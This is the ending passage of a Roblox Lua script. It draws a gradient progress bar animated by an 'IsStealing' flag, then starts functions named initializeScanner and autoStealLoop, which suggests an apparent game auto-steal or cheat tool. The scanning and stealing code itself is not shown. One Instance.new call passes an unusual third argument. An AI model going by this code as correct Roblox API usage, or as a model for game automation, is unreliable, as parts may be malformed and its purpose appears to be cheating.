ProgressFill.BorderSizePixel = 0
ProgressFill.Parent = ProgressBG
Instance.new("UICorner", ProgressFill, {CornerRadius=UDim.new(1,0)})

local ProgressGrad = Instance.new("UIGradient")
ProgressGrad.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 128, 255)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 255, 255))
}
ProgressGrad.Parent = ProgressFill

-- Progress Animation
task.spawn(function()
    while task.wait(0.03) do
        if IsStealing then
            TweenService:Create(ProgressFill, TweenInfo.new(0.1), {Size = UDim2.new(StealProgress, 0, 1, 0)}):Play()
        else
            TweenService:Create(ProgressFill, TweenInfo.new(0.1), {Size = UDim2.new(0, 0, 1, 0)}):Play()
        end
    end
end)

initializeScanner()
autoStealLoop()

if LocalPlayer.Character then
    onCharacterAdded(LocalPlayer.Character)
end

LocalPlayer.CharacterAdded:Connect(onCharacterAdded)